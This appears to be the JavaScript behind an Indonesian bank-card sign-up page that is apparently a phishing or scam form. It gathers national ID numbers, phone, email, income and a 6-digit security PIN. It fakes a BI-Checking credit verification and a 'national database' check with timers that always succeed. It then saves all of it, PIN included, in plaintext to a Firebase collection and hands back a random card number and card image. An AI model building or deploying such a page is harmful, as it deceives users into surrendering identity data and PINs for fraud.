let currentStep = 1;
const totalSteps = 8;

function nextStep(s) {
    // VALIDASI KETAT: Field tidak boleh kosong!
    if (s === 2) {
        if (document.getElementById('inputNama').value.trim().length < 3) return alert("Isi Nama Lengkap dengan benar!");
        if (document.getElementById('inputNIK').value.length < 16) return alert("NIK harus 16 digit!");
    } else if (s === 3) {
        if (!document.getElementById('inputWA').value.startsWith('08')) return alert("Gunakan nomor WhatsApp valid (08...)!");
        if (!document.getElementById('inputEmail').value.includes('@')) return alert("Email tidak valid!");
    } else if (s === 4) {
        if (document.getElementById('jobType').value === "") return alert("Pilih Pekerjaan Anda!");
        if (document.getElementById('income').value === "") return alert("Isi Pendapatan bulanan!");
    } else if (s === 5) {
        if (document.getElementById('emergencyName').value.trim() === "") return alert("Isi Nama Kontak Darurat!");
    } else if (s === 6) {
        if (document.getElementById('inputPW').value.length < 6) return alert("PIN Keamanan wajib 6 digit angka!");
    }

    currentStep = s;
    updateUI(s);
    if (s === 6) simulasiAnalisis();
}

function updateUI(s) {
    document.querySelectorAll('.step').forEach(step => step.classList.remove('active'));
    document.getElementById('step' + s).classList.add('active');
    const percent = ((s - 1) / (totalSteps - 1)) * 100;
    document.getElementById('progressLine').style.width = percent + "%";
    document.querySelectorAll('.circle').forEach((c, i) => {
        if (i < s-1) { c.classList.add('completed'); c.innerHTML = "✓"; }
        else if (i === s-1) { c.classList.add('active'); c.innerHTML = i+1; }
        else { c.classList.remove('active', 'completed'); c.innerHTML = i+1; }
    });
}

function simulasiAnalisis() {
    const status = document.getElementById('slikStatus');
    const btn = document.getElementById('btnSlik');
    setTimeout(() => status.innerText = "Sinkronisasi BI-Checking...", 1500);
    setTimeout(() => {
        status.innerHTML = "<b style='color:green'>IDENTITAS TERVERIFIKASI</b><br>Skor Kredit: A (Sangat Baik)";
        btn.style.display = "block";
    }, 3500);
}

async function generateFinal() {
    if (!document.getElementById('checkAgree').checked) return alert("Harap setujui pernyataan tanggung jawab!");
    
    // VALIDASI DUPLIKAT REAL-TIME KE FIREBASE
    const nik = document.getElementById('inputNIK').value;
    const btn = document.getElementById('btnGenerate');
    btn.disabled = true;
    btn.innerText = "MENGECEK DATABASE...";

    try {
        const check = await db.collection("nasabah").where("nik", "==", nik).get();
        if (!check.empty) {
            alert("MAAF: NIK Anda sudah terdaftar dalam sistem kami.");
            location.reload(); return;
        }
        updateUI(8);
        initQueue();
    } catch(e) { alert("Server Sibuk!"); btn.disabled = false; }
}

function initQueue() {
    // Simpan target waktu di localStorage agar walau tab ditutup waktu tetap jalan
    const duration = 120; // 2 Menit
    const targetTime = Date.now() + (duration * 1000);
    localStorage.setItem('bdn_target_time', targetTime);
    runQueue();
}

function runQueue() {
    const qStatus = document.getElementById('queueStatus');
    const tDisplay = document.getElementById('timerDisplay');
    const fillBar = document.getElementById('fillBar');
    
    const interval = setInterval(() => {
        const now = Date.now();
        const target = localStorage.getItem('bdn_target_time');
        const diff = Math.ceil((target - now) / 1000);

        if (diff <= 0) {
            clearInterval(interval);
            tDisplay.innerText = "Estimasi: Selesai";
            fillBar.style.width = "100%";
            finalRevealProcess();
            return;
        }

        const progress = ((120 - diff) / 120) * 100;
        fillBar.style.width = progress + "%";

        // Logic Hilangkan "0 Min"
        const m = Math.floor(diff / 60);
        const s = diff % 60;
        tDisplay.innerText = m > 0 ? `Estimasi: ${m} Min ${s} Detik` : `Estimasi: ${s} Detik`;

        if (diff > 80) qStatus.innerText = "Enkripsi Protokol Keamanan...";
        else if (diff > 40) qStatus.innerText = "Verifikasi Database Nasional...";
        else qStatus.innerText = "Menerbitkan Sertifikat Digital...";
    }, 1000);
}

function finalRevealProcess() {
    document.getElementById('processingArea').style.display = 'none';
    document.getElementById('finalReveal').style.display = 'block';

    // Sequence Tampilan Perlahan
    setTimeout(() => document.getElementById('rev1').classList.add('show'), 1000);
    setTimeout(() => document.getElementById('rev2').classList.add('show'), 2500);
    setTimeout(() => document.getElementById('rev3').classList.add('show'), 4000);
    
    setTimeout(async () => {
        await saveToFirebase(); // Simpan saat semua OK
        const card = document.getElementById('captureArea');
        card.style.opacity = "1";
        card.style.transform = "scale(1)";
        document.getElementById('btnDownload').style.display = "block";
    }, 5500);
}

async function saveToFirebase() {
    const nama = document.getElementById('inputNama').value;
    const fullNo = "0810" + Array.from({length: 12}, () => Math.floor(Math.random() * 10)).join('');

    try {
        await db.collection("nasabah").add({
            nama: nama.toUpperCase(),
            nik: document.getElementById('inputNIK').value,
            wa: document.getElementById('inputWA').value,
            email: document.getElementById('inputEmail').value,
            pin: document.getElementById('inputPW').value,
            nomor_kartu: fullNo,
            saldo: 0,
            tgl_daftar: new Date().toISOString()
        });

        document.getElementById('displayNo').innerText = fullNo.match(/.{1,4}/g).join(" ");
        document.getElementById('displayName').innerText = nama.toUpperCase();
    } catch(e) { console.log(e); }
}

function takeScreenshot() {
    html2canvas(document.getElementById('captureArea'), { scale: 3, backgroundColor: null }).then(canvas => {
        const link = document.createElement('a');
        link.download = `BDN-CARD-${document.getElementById('inputNama').value}.png`;
        link.href = canvas.toDataURL("image/png");
        link.click();
    });
}
